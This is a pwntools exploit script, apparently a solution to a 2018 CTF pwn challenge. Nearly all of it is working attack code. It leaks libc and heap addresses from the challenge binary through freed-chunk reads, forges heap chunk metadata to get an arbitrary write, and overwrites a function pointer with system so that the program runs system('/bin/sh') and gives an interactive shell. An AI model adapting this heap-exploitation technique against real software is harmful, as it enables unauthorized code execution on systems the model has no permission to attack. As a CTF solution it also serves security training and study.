from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./2018_wangding_final_pwn")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./2018_wangding_final_pwn")
else:
	pass

def add_character(size,name,c_type):
	p.sendafter("Your choice : ","1")
	p.sendlineafter("name :",str(size))
	p.sendafter("name of character :",name)
	p.sendlineafter("type of the character :",c_type)

def show_character():
	p.sendafter("Your choice : ","2")

def free_character(index):
	p.sendafter("Your choice : ","3")
	p.sendlineafter("Which character do you want to eat:",str(index))

def goto_secret():
	p.sendafter("Your choice : ","1337")

def add_note(size,name,content):
	p.sendlineafter("$ ","new")
	p.sendafter("$ note size:",str(size))
	p.sendlineafter("$ note name:",str(name))
	p.sendlineafter("$ note content:",content)
	
def edit_note(index,name,content):
	p.sendlineafter("$ ","edit")
	p.sendafter("$ note index:",str(index))
	p.sendlineafter("$ note name:",str(name))
	p.sendlineafter("$ note content:",content)

def delete_note(index):
	p.sendlineafter("$ ","delete")
	p.sendafter("$ note index:",str(index))

def mark(index,info):
	p.sendlineafter("$ ","mark")
	p.sendafter("$ index of note you want to mark:",str(index))
	p.sendlineafter("$ mark info:",info)

def delete_mark(index):
	p.sendlineafter("$ ","delete_mark")
	p.sendafter("$ mark index:",str(index))

def edit_mark(index,info):
	p.sendlineafter("$ ","edit_mark")
	p.sendafter("$ mark index:",str(index))
	p.sendlineafter("$ mark content:",info)

def show_mark(index):
	p.sendlineafter("$ ","show_mark")
	p.sendafter("$ mark index:",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x2182)))

def debugf2():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x20A7)))


context.terminal = ["tmux","splitw","-v"]
context.log_level = "debug"

#stage1 leak_info
#debugf()
size = 0x100
add_character(size,"a","t1")
add_character(0x100,"b","t2")
free_character(0)
add_character(size-0x30,"c"*0x8,"t3")
show_character()
p.recvuntil("c"*0x8)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
size = 0x40
add_character(size,"d","t4")
add_character(size,"e","t5")
free_character(3)
free_character(4)
add_character(size,"f","t6")
show_character()
p.recvuntil("Name[5] :")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
heap_base = leak_addr - (0x0000555555759266 - 0x555555758000)
log.success("heap_base:"+hex(heap_base))
goto_secret()

#stage2 use info
debugf2()
add_note(0x100,"1"*0x10 + p64(0x21),"c"*8)
mark(0,"aa")
mark(0,"bb")
delete_mark(0)
delete_mark(1)
target = heap_base + 0x5555557593e0 - 0x555555758000
log.success("target:"+hex(target))
payload = "b"*0x20 + p64(0) + p64(0x21) + p64(target)
edit_mark(0,payload)
mark(0,"cc")
one_gadget = libc.address + 0x45216
mark(0,"d"*8)
mark(0,"/bin/sh")
target = heap_base + (0x0000555555759640 - 0x555555758000)
payload = "g" * 0x20 + p64(0) + p64(0x21) + p64(2) + p64(target) + p64(libc.symbols["system"])
edit_note(0,"f"*8,payload)
#write func_point to system
#puts("/bin/sh") -> system("/bin/sh")
show_mark(2)
p.interactive()
